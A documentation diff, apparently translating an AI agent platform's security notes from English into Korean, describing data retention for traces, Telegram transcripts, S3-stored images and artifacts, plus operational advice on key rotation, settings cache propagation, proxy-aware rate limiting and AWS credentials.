+- Trace 는 **제한된 메타데이터만** 저장한다 — 문자 수, token, 비용, 소요 시간, subagent 의
+  trace id. 원본 프롬프트와 도구 결과는 영속되지 않지만, trace 의 `error` 와 `warnings` 는 실패
+  텍스트를 그대로 최대 1,000자까지 보관하고, 제공자나 도구의 에러 문자열은 내용을 품을 수 있다.
+- `/api/metrics` 는 project, 사용자, model 을 지목하지 않는다. 어떤 메트릭이든 지니는 라벨은
+  히스토그램의 `le` 뿐이다.
+- 로그 라인은 런의 correlation id 를 실을 뿐, 프롬프트 내용은 결코 싣지 않는다.
+- Trace, usage 행, chat, trigger 배달, 인바운드 A2A 태스크는 모두 DynamoDB TTL 로 만료된다 —
+  [OPERATIONS.md](OPERATIONS.md#행-보존) 참고.
+- **Telegram 대화 트랜스크립트** 는 project 의 봇과 주고받은 모든 턴의 *텍스트* 를 7일간
+  보관한다 — 대화별로 질문과 답을 — Bot API 가 히스토리를 돌려주지 않아 후속 질문이 그 앞의
+  질문을 실어 날라야 하기 때문이다. 그것은 chat 메시지처럼 저장된 사용자 텍스트다. chat 과 달리
+  그 대화의 다음 런 외에는 아무것도 그것을 읽지 않는다. 보낸 사람의 Telegram 사용자 id 는 턴 옆에
+  저장되고, 보낸 사람의 *이름* 은 버전이 `callerContext` 에 옵트인했을 때만 저장된다.
+- **생성된 이미지** 는 `S3_BUCKET_NAME` 이 설정돼 있으면 추측할 수 없는 UUID 키 아래 저장되고,
+  chat 행은 주소가 아니라 **오브젝트 키** 를 보관한다. `ARTIFACT_ACCESS_MODE=authenticated`
+  (기본값)는 읽기 시점에 URL 을 미리 서명하며, 수명은 독자에 맞춰 고른다. chat 뷰에는 15분,
+  재생(replay)에는 런 마감 시각 전체에 여유를 더한 값 — URL 을 가져가는 것이 *모델 제공자* 이고
+  런 중 어느 시점에 그 턴에 닿을지 모르기 때문이다 — 그리고 Slack 스레드나 저장된 A2A 태스크처럼
+  지속되는 무언가에 쓰이는 링크에는 SigV4 상한인 7일. 그 링크는 그것이 함께 온 답을 이미 읽을 수
+  있던 청중이 쥔다(`src/application/artifact/urlTtl.ts`). 버킷은 비공개로 유지된다. 대신
+  `public` 은 영구적인 직접 S3 URL 을 반환한다. 그 모드는 명시적인 공개 읽기 버킷 정책을 요구하고
+  URL 을 얻은 누구에게나 바이트를 노출한다. 애플리케이션 인증은 여전히 갤러리 메타데이터와
+  삭제를 보호하지만 오브젝트는 보호하지 않는다. **주소가 보기가 아니라 다운로드인 곳에서는
+  어쨌든 미리 서명한다** — 브라우저가 저장할 파일 이름은 `ResponseContentDisposition` 이 실어
+  나르는데 S3 는 익명 GET 에서 그것을 거부하므로, 서명되지 않은 링크는 오브젝트를 UUID 키로만
+  저장할 수 있다.
+  - 레거시 행은 공개 `url` 을 지니고 있을 수 있고 그대로 되읽힌다. 그것을 다시 쓴다고 해서 이미
+    공개인 그 오브젝트들에 누가 닿을 수 있는지는 아무것도 바뀌지 않는다 — 그러니 **버킷이 한
+    번이라도 공개 읽기였다면, 그 안의 기존 오브젝트는 지금도 공개다.** 비공개로 만드는 것은
+    운영자의 몫이고, 그렇게 하는 순간 옛 행들은 해석되지 않는다.
+  - **앱 안의 어떤 것도 오브젝트를 만료시키지 않는다.** DynamoDB TTL 은 행을 조용히 지우고 —
+    앱은 그 만료를 결코 관측하지 않는다 — 그래서 같은 시계로 오브젝트를 만료시킬 수 있는 것은
+    버킷뿐이다. 접두사별로 라이프사이클 규칙을 붙여라. 그것은
+    [OPERATIONS.md](OPERATIONS.md#새-배포를-위한-운영-체크리스트) 의 배포
+    체크리스트에 있다.
+- **Artifact 행** 은 런이 만들어 낸 모든 오브젝트를 지목하고, 그것이 저장된 이미지나 문서를
+  나열하고 지울 수 있게 만드는 전부다. 언급할 만한 귀결이 셋 있다:
+  - 행은 갤러리를 읽을 수 있게 하려고 **프롬프트의 500자 발췌** 를 보관한다. 그것은
+    `ARTIFACT_RETENTION_DAYS` 동안 사는 사용자 텍스트이며, 그것을 실어 온 chat 메시지보다 오래
+    남는다. PII 필터링은 *모델* 이 보는 것을 한정할 뿐, 저장되는 것을 한정하지 않는다.
+  - project 의 artifact 탭은 그 project 의 소유자와 admin 이 읽을 수 있다 — trace 가 쓰는 것과
+    같은 규칙이고, 이유도 같다(다른 사람의 런타임 출력을 담고 있다). 실제로는 trace 보다 더 넓은
+    노출이다. trace 는 샘플링되고 30일을 보관하지만, artifact 는 모든 오브젝트이고 180일을
+    보관한다.
+  - artifact 를 지우면 오브젝트를 먼저, 행을 나중에 지우므로 중단된 삭제는 재시도로 수렴한다.
+    chat 메시지는 그 키의 사본을 자기 안에 갖고 있으므로 트랜스크립트는 그 뒤로 이미지를 사용할
+    수 없음으로 렌더링한다. 확인 문구가 그 사실을 미리 말해 준다.
 
-## Operational notes
+## 운영 노트
 
-- **Rotate, don't just edit.** A leaked A2A key, project token or trigger secret is rotated
-  from the console (`POST …/a2a-key`, `POST …/token`, `PUT …/triggers/{id}` with
-  `rotateSecret: true`); the previous value stops working immediately.
-- **Settings propagation is not instant.** A demoted admin or a rotated A2A key keeps working
-  on instances that did not serve the write until their settings cache expires
-  (`SETTINGS_CACHE_TTL_MS`, default 5s). Immediate cross-instance revocation would need a
-  shared invalidation signal, which does not exist yet. The instance that served the write
-  uses a cache generation, so a read already in flight cannot repopulate the invalidated entry.
-- **Auth rate limiting keys on the client IP**, which behind proxies is resolved through
-  `TRUSTED_PROXY_CIDRS` — see
-  [CONFIGURATION.md](CONFIGURATION.md#authentication-and-access-control). Left empty behind
-  two proxies, every request resolves to the same hop and falls into one shared bucket, so
-  the limiter throttles the fleet rather than an abuser.
-- **AWS credentials come from the task/instance role** — never bake keys into the image.
+- **고쳐 쓰지 말고 회전시켜라.** 유출된 A2A 키, project token, trigger 시크릿은 콘솔에서
+  회전시킨다(`POST …/a2a-key`, `POST …/token`, `rotateSecret: true` 를 실은
+  `PUT …/triggers/{id}`). 이전 값은 즉시 동작을 멈춘다.
+- **설정 전파는 즉시가 아니다.** 강등된 admin 이나 회전된 A2A 키는 그 쓰기를 처리하지 않은
+  인스턴스에서 설정 캐시가 만료될 때까지 계속 동작한다(`SETTINGS_CACHE_TTL_MS`, 기본 5초).
+  인스턴스 간 즉시 취소에는 공유 무효화 신호가 필요한데, 아직 없다. 쓰기를 처리한 인스턴스는
+  캐시 세대를 쓰므로, 이미 진행 중이던 읽기가 무효화된 항목을 다시 채울 수 없다.
+- **인증 rate limit 은 클라이언트 IP 로 키잉하고**, 프록시 뒤에서 그것은
+  `TRUSTED_PROXY_CIDRS` 로 해석된다 —
+  [CONFIGURATION.md](CONFIGURATION.md#인증과-접근-제어) 참고. 프록시 둘 뒤에서
+  그것을 비워 두면 모든 요청이 같은 홉으로 해석돼 하나의 공유 버킷에 떨어지므로, 리미터는
+  남용자가 아니라 함대 전체를 조인다.
+- **AWS 자격 증명은 태스크/인스턴스 역할에서 온다** — 키를 이미지에 굽지 마라.
